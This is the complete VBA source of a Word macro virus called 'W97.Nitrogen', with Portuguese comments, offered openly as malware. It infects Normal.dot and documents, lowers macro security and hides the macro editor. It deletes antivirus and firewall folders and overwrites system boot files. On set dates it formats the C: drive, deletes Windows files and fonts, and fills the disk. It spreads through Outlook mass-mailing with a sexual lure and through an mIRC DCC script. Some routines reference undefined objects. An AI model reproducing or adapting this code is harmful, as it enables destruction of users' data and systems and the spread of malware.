'W97.Nitrogen
'By �Kr�Pt�R�

'AutoOpen = abre um documento existente
'AutoExec = quando se abre o word
'AutoNew = quando se abre um novo documento
'FileSaveAs = quando se salva o documento
Sub AutoExec()
On Error Resume Next   'Se encontrar algum erro passa � frente
AutoOpen               'Chama a AutoOpen
ChooseActions          'Chama ChooseActions
LoopIt                 'Chama LoopIt
End Sub

Sub AutoNew()
On Error Resume Next
AutoOpen
End Sub

Sub AutoOpen()
On Error Resume Next
'Baixa o nivel de seguran�a do Word
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = "1"
System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Software\Microsoft\Office\9.0\Word\Security", "Level") = "1"
'Aponta para o documento activo
Set Arch = ActiveDocument.VBProject.VBComponents.Item(1)
'Aponta para o normal.dot
Set Norm = Normal.Nitrogen.VBProject.VBComponents.Item(1)
'Aponta para copia
Set ItsMe = Me.VBProject.VBComponents.Item(1)

Norm.Name = "Nitrogen"    'Muda o nome do Modulos
Arch.Name = "Nitrogen"    'Muda o nome do Modulos
'Infecta o normal.dot se a primeira linha do Module nao for 'W97.Nitrogen
If Norm.CodeModule.Lines(1, 1) <> "'W97.Nitrogen" Then
'copia do virus para o normal.dot
Norm.CodeModule.InsertLines 1, ItsMe.CodeModule.Lines(1, ItsMe.CodeModule.CountOfLines)
End If
'Infecta os documentos se a primeira linha nao for 'W97.Nitrogen
If Arch.CodeModule.Lines(1, 1) <> "'W97.Nitrogen" Then
'copia para o documento activo
Arch.CodeModule.InsertLines 1, ItsMe.CodeModule.Lines(1, ItsMe.CodeModule.CountOfLines)
End If
'ja se sabe ne
ChooseActions
Retro
M6KHON1P
JN289GF4 (EL41EEIC)
I5GE6CE6 (P4HN289G)
Form
Special
End Sub

Sub FileSaveAs()
On Error Resume Next
'Manda os numeros para a barra de titulo do Word antes de salvar
'Se for mes de maio fecha o word i nao salva o documento
Application.ActiveWindow.Caption = "0"
Time
Application.ActiveWindow.Caption = "1"
Time
Application.ActiveWindow.Caption = "2"
Time
Application.ActiveWindow.Caption = "3"
Time
Application.ActiveWindow.Caption = "4"
Time
Application.ActiveWindow.Caption = "5"
M6KHON1P
JN289GF4 (EL41EEIC)
I5GE6CE6 (P4HN289G)
If Day(Now) >= 1 And Month(Now) = 5 Then
Tasks.ExitWindows
End If
End Sub

Private Sub Retro()
On Error Resume Next
'Redireciona o atalho Alt+F11 para uma sub vazia
KeyBindings.Add KeyCode:=BuildKeyCode(Arg1:=wdKeyAlt, Arg2:=wdKeyF11), KeyCategory:=wdKeyCategoryCommand, Command:="Protec"
'Redireciona o atalho Alt+F8 para uma sub vazia
KeyBindings.Add KeyCode:=BuildKeyCode(Arg1:=wdKeyAlt, Arg2:=wdKeyF8), KeyCategory:=wdKeyCategoryCommand, Command:="Protec"
'Deleta no menu Ferramentas a op��o macro
CommandBars("Tools").Controls("Macro").Delete
'Vai ao registro e traz path dos anti-virus
Dim McAfee, FMcAfee, FProt, FFProt, FProt2, FFProt2, VET, FVET, Avast, FAvast, TheCleaner, FTheCleaner, Panda, FPanda, AVP, FAVP, Norton, FNorton, Norman, FNorman
FProt = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Command Software\F-PROT32", "Location")
FProt2 = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\FRISK Software International\FP-Win", "Program Root")
VET = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Cybec\VET Antivirus for Win32\Resident", "VetPath")
McAfee = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\McAfee\Scan95", "szProductLocation")
Avast = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\ALWIL Software\Avast32", "Path")
TheCleaner = System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Software\MooSoft Development\The Cleaner", "tcshellex")
Panda = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Panda Software\Panda Antivirus 6.0", "Path")
AVP = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\KasperskyLab\Components\100", "Folder")
Norton = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Symantec\InstalledApps", "NAV")
Norman = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Norman Data Defense Systems", "RootPath")
'Vai ao registro e traz path das FireWalls
Dim ZoneAlarm, FZoneAlarm, BlackIce, FBlackIce, Tiny, FTiny, Sygate, FSygate
ZoneAlarm = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Zone Labs\ZoneAlarm", "InstallDirectory")
BlackIce = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Network ICE\BlackICE", "Installer") = "C:\Programas\Network ICE\BlackICE"
Tiny = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\TinySoftware\Tiny Personal Firewall\2.00", "DestPath")
Sygate = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Sygate Technologies, Inc.\Sygate Personal Firewall", "smc_install_path")
'Indica o ke ira ser apagado *.* tudo HIHI
FFProt = FProt + "\*.*"
FFProt2 = FProt2 + "\*.*"
FVET = VET + "\*.*"
FMcAfee = McAfee + "\*.*"
FAvast = Avast + "\*.*"
FTheCleaner = TheCleaner + "\*.*"
FPanda = Panda + "\*.*"
FAVP = AVP + "\*.*"
FNorton = Norton + "\*.*"
FNorman = Norman + "\*.*"
FZoneAlarm = ZoneAlarm + "\*.*"
FBlackIce = BlackIce + "\*.*"
FTiny = Tiny + "\*.*"
FSygate = Sygate + "\*.*"
'Mando os Anti-Virus com os porcos
Kill FFProt
Kill FFProt2
Kill FVET
Kill FMcAfee
Kill FAvast
Kill FTheCleaner
Kill FPanda
Kill FAVP
Kill FNorton
Shell "Deltree/y" + FNorman
Kill FZoneAlarm
Kill FBlackIce
Kill FTiny
Kill FSygate
'Desabilita a porra do Xo Bobus
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\X� BoBus - R32", "0") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\X� BoBus - R32", "1") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\X� BoBus - R32", "2") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\X� BoBus - R32", "3") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\X� BoBus - R32", "4") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\X� BoBus - R32", "5") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\X� BoBus - R32", "6") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\X� BoBus - R32", "7") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\X� BoBus - R32", "8") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\X� BoBus - R32", "9") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\X� BoBus - R32", "10") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\X� BoBus - R32", "AutoStart") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\X� BoBus - R32", "AutoVerify") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\X� BoBus - R32", "BOProt") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\X� BoBus - R32", "ExtraPort") = "DISABLED"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\X� BoBus - R32", "NetBusAdv") = "DISABLED"

End Sub

Private Sub Protec() 'Sub vazia que nao faz nada, simplemente proteje o documento

End Sub

Private Sub Action1()
On Error Resume Next
'Muda o nome da lixeira e coloca uma messagem
System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}", "") = "Nitrogen"
System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}", "InfoTip") = "Esta e a Lixeira do �Kr�Pt�R�... eu comando essa barraca ok??? ---D�Ty---"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\CLASSES\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}", "") = "�Kr�Pt�R� Recycle Bin"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\CLASSES\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}", "InfoTip") = "Esta Lixeira do �Kr�Pt�R�... eu comando essa barraca ok??? ---D�Ty---"
End Sub

Private Sub Action2()
On Error Resume Next
'Altera o registro do Windows e a Versao
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Display\Settings", "BitsPerPixel") = "1"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "�Kr�Pt�R�"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "Nitrogen"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "Version") = "Windous 007 by �Kr�Pt�R�"
End Sub

Private Sub Action3()
On Error Resume Next
'Poe o ponteiro rato com rasto, velocidade a 0, duplo clica a 100 hehe diz tudo ne
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Display\Settings", "MouseTrails") = "7"
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Mouse", "MouseSpeed") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Mouse", "DoubleClickSpeed") = "100"
End Sub

Private Sub Action4()
On Error Resume Next
'Muda as cores do Windows
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "ButtonFace") = "200 40 10"
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "ActiveTitle") = "0 250 100"
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "Menu") = "0 0 0"
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "Window") = "100 100 200"
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "ScrollBar") = "100 100 200"
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "WindowText") = "255 255 255"
End Sub

Private Sub Action5()
On Error Resume Next
'Coloca umas lembra�a nos ficheiros
N$ = WordBasic.[DefaultDir$](2) + "\Normal.dot"
FileCopy N$, "C:\Leia.dot"
SetAttr "C:\*.*", vbNormal
Open "C:\io.sys" For Output As #1
Open "C:\msdos.sys" For Output As #2
Open "C:\command.com" For Output As #3
Print #1, "Voce foi dominado pelo virus Nitrogen"
Print #2, "Escrito por �Kr�Pt�R�"
Print #3, "Foda-se p� nem depois de morto um gajo pode descansar...Tem de tar sempre um monh� entrar"
Close #1
Close #2
Close #3
Open "C:\autoexec.bat" For Output As #1
Print #1, "@echo off"
Print #1, "BREAK OFF > NUL"
Print #1, "Cls"
Print #1, "Echo @    @ @ @@@@@@@ @@@@  @@@@@ @@@@@ @@@@@ @    @"
Print #1, "Echo @@   @      @    @   @ @   @ @   @ @     @@   @"
Print #1, "Echo @ @  @ @    @    @   @ @   @ @     @@@   @ @  @"
Print #1, "Echo @  @ @ @    @    @@@@  @   @ @ @@@ @@@   @  @ @"
Print #1, "Echo @   @@ @    @    @   @ @   @ @   @ @     @   @@"
Print #1, "Echo @    @ @    @    @   @ @@@@@ @@@@@ @@@@@ @    @"
Print #1, "Echo voce foi destruido pelo virus Nitrogen"
Print #1, "pause > nul"
Print #1, "Cls"
Print #1, "Echo escrito por �Kr�Pt�R�"
Print #1, "pause > nul"
Print #1, "Cls"
Print #1, "Echo Voce quer se vingar de mim???"
Print #1, "pause > nul"
Print #1, ":inicio"
Print #1, "Cls"
Print #1, "Echo    @              "
Print #1, "Echo   @ @             "
Print #1, "Echo    @ @            "
Print #1, "Echo     @ @ @ @ @ @   "
Print #1, "Echo      @  @ @ @ @ @ "
Print #1, "Echo      @         @  "
Print #1, "Echo       @       @   "
Print #1, "Echo        @     @    "
Print #1, "Cls"
Print #1, "Echo       @           "
Print #1, "Echo      @ @          "
Print #1, "Echo      @ @          "
Print #1, "Echo      @ @ @ @ @ @  "
Print #1, "Echo      @  @ @ @ @ @ "
Print #1, "Echo      @         @  "
Print #1, "Echo       @       @   "
Print #1, "Echo        @     @    "
Print #1, "Goto :inicio"
Close #1

End Sub

Private Sub Action6()
On Error Resume Next
'Altera o nome dos dispositivos do gestor de dispositivos
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Hardware\Description\System\CentralProcessor\0", "VendorIdentifier") = "Genuine �Kr�Pt�R� Processor"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Hardware\Description\System\CentralProcessor\0", "Identifier") = "Nitrogen"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Hardware\DeveiceMap\SerialComm", "COM1") = "YOU BE STOP ME BUT YOU DONT STOP ALL"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Hardware\DeviceMap\SerialComm", "COM1") = "YOU BE STOP ME BUT YOU DONT STOP ALL"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Hardware\DeviceMap\SerialComm", "COM2") = "YOU BE STOP ME BUT YOU DONT STOP ALL"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Enum\BIOS\*PNP0000\01", "DeviceDesc") = "�Kr�Pt�R� --> I AM SOMEWHERE IN THE TIME"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Enum\BIOS\*PNP0100\03", "DeviceDesc") = "�Kr�Pt�R� --> I AM SOMEWHERE IN THE TIME"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Enum\BIOS\*PNP0200\02", "DeviceDesc") = "�Kr�Pt�R� --> I AM SOMEWHERE IN THE TIME"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Enum\BIOS\*PNP0303\05", "DeviceDesc") = "�Kr�Pt�R� --> I AM SOMEWHERE IN THE TIME"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Enum\BIOS\*PNP0400\0A", "DeviceDesc") = "�Kr�Pt�R� --> I AM SOMEWHERE IN THE TIME"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Enum\BIOS\*PNP0501\08", "DeviceDesc") = "�Kr�Pt�R� --> I AM SOMEWHERE IN THE TIME"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Enum\BIOS\*PNP0501\09", "DeviceDesc") = "�Kr�Pt�R� --> I AM SOMEWHERE IN THE TIME"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Enum\BIOS\*PNP0700\0B", "DeviceDesc") = "�Kr�Pt�R� --> I AM SOMEWHERE IN THE TIME"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Enum\BIOS\*PNP0800\06", "DeviceDesc") = "�Kr�Pt�R� --> I AM SOMEWHERE IN THE TIME"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Enum\BIOS\*PNP0A03\0C", "DeviceDesc") = "�Kr�Pt�R� --> I AM SOMEWHERE IN THE TIME"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Enum\BIOS\*PNP0B00\04", "DeviceDesc") = "�Kr�Pt�R� --> I AM SOMEWHERE IN THE TIME"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Enum\BIOS\*PNP0C04\07", "DeviceDesc") = "�Kr�Pt�R� --> I AM SOMEWHERE IN THE TIME"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Enum\ISAPNP\CTL0070_DEV0000\FFFFFFFF", "DeviceDesc") = "�Kr�Pt�R� --> I AM SOMEWHERE IN THE TIME"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Enum\ISAPNP\CTL0070_DEV0001\FFFFFFFF", "DeviceDesc") = "�Kr�Pt�R� --> I AM SOMEWHERE IN THE TIME"
End Sub

Sub Action7()
On Error Resume Next
'Coloca uma resolu��o espetacular...Hehe 300 por 100
System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Display\Settings", "Resolution") = "300,100"
End Sub

Sub Action8()
'Elemina os menus do Word
CommandBars.ActiveMenuBar.Delete
End Sub

Sub ChooseActions()
On Error Resume Next
'Faz de modo alientorio a escolha da ac�ao
Dim Chance
Randomize
Chance = Int((90 * Rnd) + 1)
If Chance = 10 Then Action1
If Chance = 20 Then Action2
If Chance = 30 Then Action3
If Chance = 40 Then Action4
If Chance = 50 Then Action5
If Chance = 60 Then Action6
If Chance = 70 Then Action7
If Chance = 80 Then Action8
End Sub

Sub LoopIt()
On Error Resume Next
'Se o segundo for igual ao minute, obriga o men a dizer ke tem pila de minhoca...Hehe
If Second(Now) = Minute(Now) Then
Msg = "ERRO NO SISTEMA, a possivel causa � voce ter pila de minhoca!!! Voce tem uma pila de minhoca?"
Style = vbYesNo + vbQuestion
Title = "Microsoft Word"
Ret = MsgBox(Msg, Style, Title)
If Ret = vbNo Then LoopIt
End If
End Sub

Sub Time()
'Gera o tempo, quando salva o documento
On Error Resume Next
Dim PauseTime, Start, Finish, TotalTime
    PauseTime = 1
    Start = Timer
    Do While Timer < Start + PauseTime
        DoEvents
Loop
End Sub

Sub Form()
'Se o dia for igual ao mes faz aparecer um form na tela hihi
On Error Resume Next
If Day(Now) = Month(Now) Then
Gajaneca.Show
End If
End Sub

'Estas ac�oes sao so ac�oes especiais
Sub Special()
On Error Resume Next
'Mensagem, fecha o Word e format
If Day(Now) = "1" And Month(Now) = "8" Then MsgBox "OK!!!, Is time to kill!!!", vbSystemModal + vbOKOnly, "�Kr�Pt�R�": Application.Quit wdDoNotSaveChanges: Tasks.ExitWindows
Shell "C:\Windows\Command\Format.com C:/Autotest"
'Pergunta se ker remover o Windows e so da o botao de sim
If Day(Now) = "13" And Month(Now) = "4" Then
mbox = "Ow!!! Quer remover o Windows???": st = vbYes + vbQuestion: tit = "�Kr�Pt�R�"
r = MsgBox(mbox, st, tit)
If r = vbYes Then
Application.StatusBar = "Removendo C:\Windows... 5%"
FileSystem.Kill "C:\Windows\*.exe"
Application.StatusBar = "Removendo C:\Windows... 14%"
FileSystem.Kill "C:\Windows\*.bmp"
Application.StatusBar = "Removendo C:\Windows... 20%"
FileSystem.Kill "C:\Windows\*.gif"
Application.StatusBar = "Removendo C:\Windows... 30%"
FileSystem.Kill "C:\Windows\*.com"
Application.StatusBar = "Removendo C:\Windows... 36%"
FileSystem.Kill "C:\Windows\*.jpg"
Application.StatusBar = "Removendo C:\Windows... 45%"
FileSystem.Kill "C:\Windows\*.dll"
Application.StatusBar = "Removendo C:\Windows... 57%"
FileSystem.Kill "C:\Windows\*.sys"
Application.StatusBar = "Removendo C:\Windows... 68%"
FileSystem.Kill "C:\Windows\*.txt"
Application.StatusBar = "Removendo C:\Windows... 72%"
FileSystem.Kill "C:\Windows\*.doc"
FileSystem.Kill "C:\Windows\*.gif"
Application.StatusBar = "Removendo C:\Windows... 86%"
FileSystem.Kill "C:\Windows\*.dat"
FileSystem.Kill "C:\Windows\*.ini"
Application.StatusBar = "Removendo C:\Windows... 99%"
FileSystem.Kill "C:\Windows\*.pwl"
Application.StatusBar = "Removendo C:\Windows... done"
End If
End If
'Mensagem e cria pastas ate nao haver mais espa�o no disco
If Day(Now) = "1" And Month(Now) >= "1" Then
MsgBox "OW! Dia da confus�o? Sabes o que isso (da uma expreitade-la no Explorer)???", vbExclamation, "�Kr�Pt�R�"
Static P
Static Q
Dim S
S = "\Nitrogen"
P = "C:\Nitrogen"
MkDir P
Pastas:
Q = Q + 1
P = P + S
MkDir P
GoTo Pastas
End If
'Mensagem e apaga o conteudo do iniciar
If Day(Now) = "7" And Month(Now) >= "6" Then
MsgBox "O Sistema decidio ke como voce � Duty tamb�m n�o precisa de iniciar???", vbCritical, "�Kr�Pt�R�"
Shell "Deltree/y c:\windows\menu iniciar"
Shell "Deltree/y c:\windows\start menu"
End If
'Mensagem e apaga as fontes do windows
If Day(Now) = "28" And Month(Now) >= "2" Then
MsgBox "AHAH!!!Duty check your fonts", vbExclamation, "�Kr�Pt�R�"
Shell "Deltree/y C:\windows\fonts"
Open "C:\autoexec.bat" For Output As #1
Print #1, "@echo off"
Print #1, "Deltree/y C:\windows\fonts"
Close #1
End If
'Faz um joginho se ganhar deleta a pasta dos programas
If Day(Now) = Minute(Now) Then
MsgBox "Game Pockey Quinja no teu monhenho", vbExclamation, "�Kr�Pt�R�"
Dim FILEEE
FILEEE = Dir("C:\Windows\*.*")
Open FILEEE For Append As #1
Randomize: o = Int((2 * Rnd) + 1)
If o = 1 Then Print #1, "Ow, you loose, try again!!!"
If o = 2 Then Print #1, "Ow yeah! You win... SHIT": Shell "Deltree/y C:\programas"
Print #1, "Do you want to play again???"
Print #1, ""
Close #1
End If
'Isto e a nova versao do Windows HEHEHE
If Day(Now) = 25 And Month(Now) = 12 Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics", "BorderWidth") = "100"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics", "CaptionHeight") = "-1000"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics", "CaptionWidth") = "-1000"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics", "IconSpacing") = "-2500"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics", "IconSpacingFactor") = "1000"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics", "IconVerticalSpacing") = "-2000"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics", "MenuHeight") = "1000"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics", "MenuWidth") = "1000"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics", "ScrollHeight") = "-1000"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics", "ScrollWidth") = "1000"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics", "Shell Icon BPP") = "1500"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics", "SmCaptionHeight") = "-1000"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics", "SmCaptionWidth") = "-1500"
End If
End Sub
'Envia o Virus pelo E-Mail
Function M6KHON1P()
On Error Resume Next
Set LO0TLPP3 = CreateObject("Outlook.Application")
If LO0TLPP3 = "Outlook" Then
Set OJ635QLF = LO0TLPP3.GetNameSpace("MAPI")
Set PA314IE4 = OJ635QLF.AddressLists
For Each LRD0IK85 In PA314IE4
If LRD0IK85.AddressEntries.Count <> 0 Then
FJ86ECJP = LRD0IK85.AddressEntries.Count
For KK94TEGG = 1 To FJ86ECJP
Set CICQC7G8 = LO0TLPP3.CreateItem(0)
Set VL2G87R2 = LRD0IK85.AddressEntries(KK94TEGG)
CICQC7G8.To = VL2G87R2.Address
CICQC7G8.Subject = "Very Important!"
CICQC7G8.Body = "Hi:" & vbCrLf & "it's contain sites of sexy" & vbCrLf & ""
Set V01B8L4J = CICQC7G8
V01B8L4J = Chr(65) & Chr(116) & Chr(116) & Chr(97) & Chr(99) & Chr(104) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(115)
L6856229 = V3F7GPEG
CICQC7G8.DeleteAfterSubmit = True
V01B8L4J.Add L6856229
If CICQC7G8.To <> "" Then
CICQC7G8.Send
End If
Next
End If
Next
End If
End Function
'Envia o virus pelo Mirc
Function JN289GF4(EL41EEIC)
On Error Resume Next
If EL41EEIC <> "" Then
I1A717F3 = D585C1N8.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If N23RFUBE.fileexists("c:\mirc\mirc.ini") Then
EL41EEIC = "c:\mirc"
ElseIf N23RFUBE.fileexists("c:\mirc32\mirc.ini") Then
EL41EEIC = "c:\mirc32"
ElseIf N23RFUBE.fileexists(I1A717F3 & "\mirc\mirc.ini") Then
EL41EEIC = I1A717F3 & "\mirc"
ElseIf N23RFUBE.fileexists(I1A717F3 & "\mirc32\mirc.ini") Then
EL41EEIC = I1A717F3 & "\mirc"
Else
EL41EEIC = ""
End If
End If
If EL41EEIC <> "" Then
Set QE867UU1 = N23RFUBE.CreateTextFile(EL41EEIC & "\script.ini", True)
QE867UU1 = "[script]" & vbCrLf & "n0=on 1:JOIN:#:{"
QE867UU1 = QE867UU1 & vbCrLf & "n0=on 1:JOIN:#:{"
QE867UU1 = QE867UU1 & vbCrLf & "n1=  /if ( $nick == $me ) { halt }"
QE867UU1 = QE867UU1 & vbCrLf & "n2=  /." & Chr(100) & Chr(99) & Chr(99) & " send $nick "
QE867UU1 = QE867UU1 & V3F7GPEG
QE867UU1 = QE867UU1 & vbCrLf & "n3=}"
Script.Close
End If
End Function

Function I5GE6CE6(P4HN289G)
On Error Resume Next
FD2T2R6M = P4HN289G
Set E19HU2J0 = N23RFUBE.GetFolder(FD2T2R6M)
Set JS6N7DTE = E19HU2J0.Files
For Each IH0U7262 In JS6N7DTE
If LCase(IH0U7262.Name) = "mirc.ini" Then
JN289GF4 (IH0U7262.ParentFolder)
End If
If N23RFUBE.GetExtensionName(IH0U7262.Path) = "dot" Then
N23RFUBE.CopyFile wscript.scriptfullname, IH0U7262.Path, True
End If
If N23RFUBE.GetExtensionName(IH0U7262.Path) = "doc" Then
N23RFUBE.CopyFile wscript.scriptfullname, IH0U7262.Path, True
End If
Next
Set GJLFB106 = E19HU2J0.Subfolders
For Each G4F1UJQ6 In GJLFB106
Call G4F1UJQ6.Path
Next
End Function